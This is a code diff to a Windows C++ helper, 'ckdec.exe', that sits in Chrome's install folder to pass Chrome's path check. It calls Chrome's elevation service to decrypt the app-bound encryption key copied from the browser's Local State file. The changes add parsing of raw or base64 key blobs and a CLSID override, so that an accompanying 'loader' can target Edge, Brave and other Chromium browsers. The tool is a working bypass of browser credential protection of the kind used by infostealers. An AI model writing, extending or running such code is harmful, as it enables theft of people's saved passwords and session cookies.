@@ -6,16 +6,23 @@
 //   C:\Program Files\Google\Chrome\Application\ckdec.exe
 // so that MaybeTrimProcessPath() yields C:\Program Files\Google\Chrome.
 //
-// usage: ckdec.exe <payload.bin> <key.out>
+// usage: ckdec.exe <payload.bin> <key.out> [clsid]
+//
+// payload.bin is either the raw APPB-less blob (keytool) or the base64 text
+// straight out of Local State; both are accepted. clsid overrides the Chrome
+// stable CLSID -- the loader passes the CLSID it discovered under the browser's
+// Application dir, so the same helper works for Edge/Brave/Chromium forks.
 
 #define WIN32_LEAN_AND_MEAN
 #define NOMINMAX
 #include <windows.h>
+#include <wincrypt.h>
 #include <objbase.h>
 #include <oleauto.h>
 
 #include <cstdio>
 #include <cstdlib>
+#include <cstring>
 #include <vector>
 
 // Stable Chrome install mode (chrome/install_static/google_chrome_install_modes.h).
@@ -78,9 +85,35 @@ static bool write_file(const wchar_t* path,
   return ok && wrote == data.size();
 }
 
+// The service wants the APPB blob without the four-byte magic. Two producers:
+//   keytool  -> raw bytes, magic already stripped;
+//   loader   -> base64 text copied verbatim from Local State (still has APPB).
+// Try raw magic first, then base64; fall back to raw so keytool keeps working.
+static void prepare_payload(std::vector<unsigned char>& data) {
+  if (data.size() >= 4 && std::memcmp(data.data(), "APPB", 4) == 0) {
+    data.erase(data.begin(), data.begin() + 4);
+    return;
+  }
+  DWORD need = 0;
+  if (CryptStringToBinaryA(reinterpret_cast<const char*>(data.data()),
+                           static_cast<DWORD>(data.size()), CRYPT_STRING_BASE64,
+                           nullptr, &need, nullptr, nullptr) &&
+      need >= 4 && need <= 64 * 1024) {
+    std::vector<unsigned char> blob(need);
+    if (CryptStringToBinaryA(reinterpret_cast<const char*>(data.data()),
+                             static_cast<DWORD>(data.size()),
+                             CRYPT_STRING_BASE64, blob.data(), &need, nullptr,
+                             nullptr) &&
+        need >= 4 && std::memcmp(blob.data(), "APPB", 4) == 0) {
+      data.assign(blob.begin() + 4, blob.begin() + need);
+    }
+  }
+}
+
 int wmain(int argc, wchar_t** argv) {
-  if (argc != 3) {
-    std::fwprintf(stderr, L"usage: %ls <payload.bin> <key.out>\n", argv[0]);
+  if (argc != 3 && argc != 4) {
+    std::fwprintf(stderr, L"usage: %ls <payload.bin> <key.out> [clsid]\n",
+                  argv[0]);
     return 2;
   }
 
@@ -89,7 +122,18 @@ int wmain(int argc, wchar_t** argv) {
     std::fwprintf(stderr, L"cannot read %ls\n", argv[1]);
     return 2;
   }
+  prepare_payload(payload);
+  if (payload.empty()) {
+    std::fwprintf(stderr, L"empty app-bound blob\n");
+    return 2;
+  }
   std::wprintf(L"payload %zu bytes\n", payload.size());
+
+  CLSID elevator_clsid = kElevatorClsid;
+  if (argc == 4 && FAILED(CLSIDFromString(argv[3], &elevator_clsid))) {
+    std::fwprintf(stderr, L"bad clsid %ls\n", argv[3]);
+    return 2;
+  }
 
   HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
   if (FAILED(hr)) {
@@ -99,7 +143,7 @@ int wmain(int argc, wchar_t** argv) {
 
   IElevatorAny* elevator = nullptr;
   for (const IID& iid : kElevatorIids) {
-    hr = CoCreateInstance(kElevatorClsid, nullptr, CLSCTX_LOCAL_SERVER, iid,
+    hr = CoCreateInstance(elevator_clsid, nullptr, CLSCTX_LOCAL_SERVER, iid,
                           reinterpret_cast<void**>(&elevator));
     if (SUCCEEDED(hr) && elevator) break;
     elevator = nullptr;
